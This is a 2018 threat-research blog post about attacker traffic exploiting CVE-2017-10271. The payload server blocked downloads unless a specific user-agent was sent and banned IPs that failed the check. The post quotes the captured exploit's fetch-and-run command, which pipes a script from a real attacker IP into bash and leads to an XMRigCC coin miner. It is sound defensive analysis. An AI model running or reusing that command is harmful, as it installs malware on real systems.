---
title: "Disinvited from a URL by User-Agent"
#author: "Author Name"
description: "Discussion about attacker traffic providing a URL that blocked connections if they didn't specify a specific user-agent"
#cover: "/img/cover.jpg"
#tags: ["tagA", "tagB"]
date: 2018-06-15T00:00:00-00:00
draft: false
---
I have to check this thing every day or I miss something.  It's not every day that I see something new - most days are the same things I've already seen and new copies of malware that's basically the same as the old.

This morning, however, I witnessed a tactic I had wondered if anyone considered employing in the past, but hadn't actually observed evidence of.

I had traffic showing an attacker attempting to exploit CVE-2017-10271, dropping software from hxxp://107.181.174.232/lin/st.sh.  This was similar to yesterday's traffic, but then I wasn't able to capture the script before losing the server.  This morning I attempted to grab the script.

```bash
wget hxxp://107.181.174.232/lin/st.sh
--2018-06-15 11:15:13--  hxxp://107.181.174.232/lin/st.sh
Connecting to 107.181.174.232:80... connected.
HTTP request sent, awaiting response... 403 Forbidden
2018-06-15 11:15:14 ERROR 403: Forbidden.
```

Let's try again with the windows version of this...

```bash
wget hxxp://107.181.174.232/win/checking.ps1
--2018-06-15 11:15:56--  hxxp://107.181.174.232/win/checking.ps1
Connecting to 107.181.174.232:80... failed: Connection refused.
```

Interesting - server's there, URL's forbidden.  Then, I try again but "connection refused".  But, the original request from my logs was actually:

```xml
<void index="2">
    <string>wget --user-agent linux -O - hxxp://107.181.174.232/lin/st.sh | bash</string>
</void>
```

The user agent was specified - I only used wget's default.  Normally that's not a problem.

However - an attacker that wants to make things just a bit harder for researchers could filter based on user agent, then turn IP addresses that fail the filter into a firewall rule, banning the IP address.

I try again from a different IP address...

```bash
wget --user-agent linux hxxp://107.181.174.232/lin/st.sh
--2018-06-15 11:18:16--  hxxp://107.181.174.232/lin/st.sh
Connecting to 107.181.174.232:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1073 (1.0K) [application/x-sh]
Saving to: ‘st.sh’

st.sh               100%[===================>]   1.05K  --.-KB/s    in 0s      

2018-06-15 11:18:16 (108 MB/s) - ‘st.sh’ saved [1073/1073]
```

Thank you!

st.sh leads to other downloads, including "xmrig" and "H" for 32/64 bit x86.  At least xmrig looks to be a coin miner called XMRigCC, doing the cryptonight algorithm.

It's great to see some new, simple tactics being used.

Even after going back with the new user-agent, I get a 404 on the windows powershell script download.  I don't know what the powershell user-agent comes out as immediately, or I'd try it.  I don't get the same fail-to-ban behavior using the "linux" user-agent for the Windows download though, perhaps because my IP is already accepted, or perhaps because the aperture for what's accepted is wide enough.
